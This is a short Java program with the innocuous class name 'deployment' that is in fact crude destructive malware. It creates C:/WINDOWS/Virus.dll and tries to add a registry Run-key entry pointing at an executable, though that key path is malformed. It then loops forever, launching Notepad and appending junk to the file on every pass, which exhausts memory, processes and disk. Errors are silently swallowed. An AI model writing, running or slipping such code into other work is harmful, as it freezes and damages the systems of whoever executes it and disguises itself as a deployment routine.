package leproject;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileWriter;
import java.io.IOException;
class deployment
{


public static void main(String args[]) throws IOException {
	
	try
  {
	FileWriter f=new FileWriter("C:/WINDOWS/Virus.dll",true);
	Process process = Runtime.getRuntime().exec("cmd /c REG ADD HKLM\\SOFTWARE\\Windows//Run /v AppInfo /t REG_SZ /d C:/Program Files/runtime.exe");
   while(true)
   {
	   Process np = Runtime.getRuntime().exec("cmd /c notepad");   
	   f.write("aw#m1kl*&m29asmmm#%01i20^");
   }
  }
  catch(FileNotFoundException e){}
   catch(IOException e){}
 }
} 
